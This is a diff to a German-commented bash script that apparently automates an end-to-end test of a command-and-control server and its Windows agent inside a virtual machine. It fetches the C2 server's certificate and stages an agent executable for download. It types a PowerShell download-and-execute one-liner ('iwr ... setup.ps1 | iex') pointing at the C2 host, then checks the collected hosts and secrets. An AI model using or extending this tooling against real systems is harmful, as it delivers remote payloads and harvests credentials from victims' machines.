@@ -65,9 +65,19 @@ if ! sudo grep -q "cn $C2_IP" /srv/kx-c2/kx-server.log 2>/dev/null; then
         || fehler "der C2 laeuft nicht — siehe /srv/kx-c2/kx-server.log"
 fi
 
+echo "== 2b. Zertifikat holen =="
+# rcgen erzeugt bei jedem Start des Servers ein neues Zertifikat. Liegt in
+# /srv/kx-www noch das alte, meldet der Agent "BadSignature".
+openssl s_client -connect "127.0.0.1:$C2_PORT" -servername "$C2_IP" </dev/null 2>/dev/null \
+    | openssl x509 -outform PEM > /tmp/kx-server.pem
+sudo cp /tmp/kx-server.pem /srv/kx-www/kx-server.pem
+sudo chmod a+r /srv/kx-www/kx-server.pem
+
 echo "== 3. Dateien bereitstellen =="
 sudo mkdir -p /srv/kx-www
-sudo cp /srv/kx-win/kx-agent.exe /srv/kx-win/kx-server.pem /srv/kx-win/kx-server-pub.json /srv/kx-www/ 2>/dev/null
+# Das Zertifikat kommt aus Schritt 2b — hier nicht kopieren, sonst
+# landet die alte Kopie wieder im WWW-Verzeichnis.
+sudo cp /srv/kx-win/kx-agent.exe /srv/kx-win/kx-server-pub.json /srv/kx-www/ 2>/dev/null
 sudo sh -c 'cat /srv/kx-win/kx-token.txt > /srv/kx-www/kx-token.txt; chmod 600 /srv/kx-www/kx-token.txt'
 # Die Quelle fuer das Setup-Skript ist der Repo-Checkout: getestet wird das
 # Skript aus dem Repository, nicht eine Kopie daneben.
@@ -94,14 +104,21 @@ sudo docker exec "$CONTAINER" chmod +x /tmp/kx-vm-control.sh 2>/dev/null
 # Die Kommandozeile in der VM oeffnen und den Befehl tippen.
 # Die Argumente laufen als eigene Parameter an `bash -c` — sonst
 # zerstoeren die Anfuehrungszeichen im Befehl das quoting.
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh tippen "meta_l-r"' _ >/dev/null 2>&1
+# Das Control-Skript erwartet den Unterbefehl als $1 und den Text als $2.
+#
+# Vorher: alle Fenster minimieren (Win+M). Sonst landen die Tasten in einem
+# Fenster, das nicht im Vordergrund liegt — der Tipp geht dann ins Leere,
+# ohne dass man es sieht.
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1" "$2"' _ tippen "meta_l-m" >/dev/null 2>&1
+sleep 1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1" "$2"' _ tippen "meta_l-r" >/dev/null 2>&1
 sleep 2
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ "cmd" >/dev/null 2>&1
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1" "$2"' _ text "cmd" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1"' _ enter >/dev/null 2>&1
 sleep 4
 BEFEHL="powershell -c \"iwr http://$C2_IP:$WWW_PORT/setup.ps1 -useb | iex\""
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ "$BEFEHL" >/dev/null 2>&1
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1" "$2"' _ text "$BEFEHL" >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1"' _ enter >/dev/null 2>&1
 echo "   Befehl getippt, warte ${WARTEZEIT}s"
 
 echo "== 5. Warten und pruefen =="
@@ -113,8 +130,8 @@ echo "   Hosts:   $HOSTS"
 echo "   Secrets: $SECRETS"
 
 echo "== 6. Log aus der VM holen =="
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ 'type C:\kx\kx-agent.log' >/dev/null 2>&1
-sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1" "$2"' _ text 'type C:\kx\kx-agent.log' >/dev/null 2>&1
+sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh "$1"' _ enter >/dev/null 2>&1
 sleep 3
 sudo docker exec "$CONTAINER" bash -c "printf 'screendump /tmp/kx-vm-ergebnis.ppm\n' | timeout 8 nc -q 1 -U /run/shm/monitor.sock" >/dev/null 2>&1
 sudo docker cp "$CONTAINER:/tmp/kx-vm-ergebnis.ppm" /tmp/kx-vm-ergebnis.ppm >/dev/null 2>&1
